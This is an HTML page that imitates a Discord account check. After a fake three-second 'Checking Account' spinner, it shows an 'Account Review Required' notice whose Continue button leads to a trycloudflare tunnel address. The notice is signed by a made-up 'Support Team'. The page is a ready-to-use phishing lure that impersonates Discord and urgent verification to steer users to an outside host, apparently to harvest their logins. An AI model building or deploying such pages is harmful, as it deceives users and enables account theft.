<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Account Check</title>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    background: radial-gradient(1200px 600px at 20% 0%, #2b2d8f 0%, rgba(43,45,143,0.0) 60%),
                linear-gradient(180deg, #0b0f2a 0%, #1b1f6a 45%, #2a2fb0 100%);
    min-height: 100vh;
}

/* Overlay */
.overlay {
    position: fixed;
    inset: 0;
    background: rgba(8,10,36,0.65);
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
    pointer-events: auto;
}

/* Modal */
.modal {
    background: #0f122f;
    width: 100%;
    max-width: 420px;
    padding: 32px;
    border-radius: 12px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.55);
    text-align: center;
    color: #e6e7ff;
    position: relative;
    z-index: 10;
    pointer-events: auto;
}

/* Hidden */
.hidden { display: none; }

/* Header */
.header {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 16px;
}

.header img {
    width: 36px;
    height: 36px;
}

h2 {
    margin: 0 0 8px;
    font-size: 20px;
    font-weight: 700;
    color: #ffffff;
}

p {
    margin: 0 0 20px;
    font-size: 14px;
    line-height: 1.55;
    color: #c7c9ff;
}

/* Loader */
.spinner {
    width: 32px;
    height: 32px;
    border: 3px solid #2b2f8f;
    border-top-color: #7289da;
    border-radius: 50%;
    margin: 20px auto 0;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* Button */
.action-btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 48px;
    background: linear-gradient(180deg, #7b8cff 0%, #5865f2 100%);
    color: #ffffff;
    text-decoration: none;
    border-radius: 999px;
    font-size: 14px;
    font-weight: 600;
    box-shadow: 0 10px 24px rgba(88,101,242,0.45);
    cursor: pointer;
    position: relative;
    z-index: 20;
    pointer-events: auto;
}

.action-btn:hover {
    filter: brightness(1.05);
    transform: translateY(-1px);
    box-shadow: 0 14px 30px rgba(88,101,242,0.6);
}

.footer-note {
    margin-top: 16px;
    font-size: 12px;
    color: #aab0ff;
}

@media (max-width: 480px) {
    .modal { padding: 24px 20px; }
    h2 { font-size: 18px; }
}
</style>
</head>
<body>

<div class="overlay">

    <!-- Loading Screen -->
    <div class="modal" id="loadingModal">
        <div class="header">
            <img src="discord.jpeg" alt="Logo" />
        </div>
        <h2>Checking Account</h2>
        <p>Please wait while we review your account status.</p>
        <div class="spinner"></div>
    </div>

    <!-- Main Prompt -->
    <div class="modal hidden" id="mainModal">
        <div class="header">
            <img src="discord.jpeg" alt="Logo" />
        </div>
        <h2>Account Review Required</h2>
        <p>
            Your account requires verification.
            Please continue to proceed.
        </p>

        <a
          href="https://delicious-finally-neon-infrastructure.trycloudflare.com"
          class="action-btn"
          target="_self"
          rel="noopener"
        >
          Continue
        </a>

        <div class="footer-note">
            Support Team | techsupport_0000
        </div>
    </div>

</div>

<script>
setTimeout(() => {
    document.getElementById("loadingModal").classList.add("hidden");
    document.getElementById("mainModal").classList.remove("hidden");
}, 3000);
</script>

</body>
</html>
